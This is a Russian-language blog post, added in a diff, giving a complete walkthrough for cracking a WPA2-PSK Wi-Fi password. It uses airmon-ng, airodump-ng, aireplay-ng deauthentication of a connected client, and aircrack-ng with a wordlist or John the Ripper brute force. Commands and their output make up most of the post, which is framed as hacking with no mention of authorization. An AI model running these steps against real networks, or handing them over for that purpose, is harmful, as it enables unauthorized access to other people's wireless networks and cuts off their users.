@@ -1,0 +1,85 @@
+---
+layout: post
+title: Подбор пароля к WiFi точке, защищенной WPA2 PSK
+tags:
+- hack
+- wifi
+---
+<p>Этапы взлома:</p>
+
+<ul><li>Переводим интерфейс в &#8220;monitor mode&#8221;.</li>
+<li>Находим сети защищенные с помощью WPA2 и Pre Shared Key.</li>
+<li>Захватываем все пакеты.</li>
+<li>Деавторизуем клиента, для захвата начального обмена пакетами.</li>
+<li>Взламываем ключ используя словари (или с помощью John The Ripper).</li>
+</ul><p>Для начала переводим карту в режим <strong>&#8220;monitor mode&#8221;</strong>:</p>
+
+<pre><code>root@bt:~# airmon-ng
+Interface       Chipset         Driver
+wifi0           Atheros         madwifi-ng
+ath0            Atheros         madwifi-ng VAP (parent: wifi0)
+ath1            Atheros         madwifi-ng VAP (parent: wifi0)
+wlan0           Ralink 2573 USB rt73usb - [phy0]
+root@bt:~# airmon-ng start wlan0
+Interface       Chipset         Driver
+wifi0           Atheros         madwifi-ng
+ath0            Atheros         madwifi-ng VAP (parent: wifi0)
+ath1            Atheros         madwifi-ng VAP (parent: wifi0)
+wlan0           Ralink 2573 USB rt73usb - [phy0]
+(monitor mode enabled on mon0)
+</code></pre>
+
+<p>Сделано. Теперь мы можем использовать карту как <strong>mon0</strong>.</p>
+
+<p>Теперь сканим доступные беспроводные сети, использующие <strong>WPA2 / PSK</strong>:</p>
+
+<pre><code>root@bt:~# airodump-ng mon0
+[CH  6 ][ Elapsed: 4 s ][ 2009-02-21 12:57]
+BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                    
+00:19:5B:52:AD:F7  -33        5        0    0  10  54   WPA2 CCMP   PSK  TestNet                                                  
+BSSID              STATION            PWR   Rate   Lost  Packets  Probe                                                            
+00:19:5B:52:AD:F7  00:1C:BF:90:5B:A3  -29   0- 1     12        4  TestNet
+</code></pre>
+
+<p>Остановите <em>airodump-ng</em> и запустите его заново, записывая все пакеты в файл:</p>
+
+<pre><code>airodump-ng mon0 --channel 10 --bssid 00:19:5B:52:AD:F7 -w /tmp/wpa2
+</code></pre>
+
+<p>В данный момент мы имеем два варианта развития событий: либо ждем, пока клиент совершит подключение и произойдет процедура авторизации, либо деавторизуем подключенного клиента и тем самым заставим его переподключиться. Время — деньги, поэтому, давайте проведем небольшой акт насилия. Нам необходимы <strong>bssid</strong> точки доступа (-a) и mac адрес подключенного клиента (-c):</p>
+
+<pre><code>root@bt:~# aireplay-ng -0 1 -a 00:19:5B:52:AD:F7 -c 00:1C:BF:90:5B:A3 mon0
+13:04:19  Waiting for beacon frame (BSSID: 00:19:5B:52:AD:F7) on channel 10
+13:04:20  Sending 64 directed DeAuth. STMAC: [00:1C:BF:90:5B:A3] [67|66 ACKs]
+</code></pre>
+
+<p>В результате <em>airodump-ng</em> должен показать <strong>“WPA Handshake:”</strong> в правом верхнем углу:</p>
+
+<pre><code>[CH 10 ][ Elapsed: 2 mins ][ 2009-02-21 13:04 ][ WPA handshake: 00:19:5B:52:AD:F7]
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                
+00:19:5B:52:AD:F7  -33 100     1338       99    0  10  54   WPA2 CCMP   PSK  TestNet                                              
+BSSID              STATION            PWR   Rate   Lost  Packets  Probe                                                           
+00:19:5B:52:AD:F7  00:1C:BF:90:5B:A3  -27  54-54      0      230
+</code></pre>
+
+<p>Остановите <em>airodump-ng</em> и убедитесь что все необходимые файлы созданы:</p>
+
+<pre><code>root@bt:/# ls /tmp/wpa2* -al
+-rw-r--r-- 1 root root 35189 2009-02-21 13:04 /tmp/wpa2-01.cap
+-rw-r--r-- 1 root root   476 2009-02-21 13:04 /tmp/wpa2-01.csv
+-rw-r--r-- 1 root root   590 2009-02-21 13:04 /tmp/wpa2-01.kismet.csv
+</code></pre>
+
+<p>С этого момента вам не нужно быть где то неподалеку от точки доступа. Весь взлом будет происходить оффлайн, поэтому вы можете остановить airodump и другие процессы. В действительности, вы можете запустить процесс взлома и идти спать, гулять и прочее&#8230; Взлом <strong>WPA2 PSK</strong> базируется на брутфорсе, и может занять длительное время. Существует два пути взлома: первый довольно быстрый, но не гарантирует успеха, а второй довольно медленный, но гарантирует что рано или поздно вы найдете ключ.</p>
+
+<p>Первый метод основывается на списках/словарях. Большое количество данных файлов вы можете найти в интернете (например <a href="http://www.theargon.com">www.theargon.com</a>), или вы можете сгенерировать его самостоятельно используя утилиты, подобные <em>John The Ripper</em>. Как только словарь создан, вы можете запустить <em>aircrack-ng</em> с данным словарем и файлом <strong>.cap</strong>, который содержит <strong>WPA2 Handshake</strong>.</p>
+
+<pre><code>aircrack-ng –w /tmp/wordlists/word.lst -b 00:19:5B:52:AD:F7 /tmp/wpa2*.cap
+</code></pre>
+
+<p>Успешность взлома напрямую зависит от сложности пароля. Другими словами, вам может повезти и вы найдете ключ сразу, или не найдете его совсем.</p>
+
+<p>Следующий метод, брутфорс, будет успешным практически наверняка, но может занять очень длительный срок. Необходимо понимать, что ключ <strong>WPA2</strong> может содержать до 64-ех символов. Для начала взлома, если вы хотите использовать <em>John The Ripper</em> для создания всех возможных парольных комбинаций, выполните следующую команду:</p>
+
+<pre><code>root@bt:~# /pentest/password/jtr/john --stdout --incremental:all | aircrack-ng -b 00:19:5B:52:AD:F7 -w - /tmp/wpa2*.cap
+</code></pre>
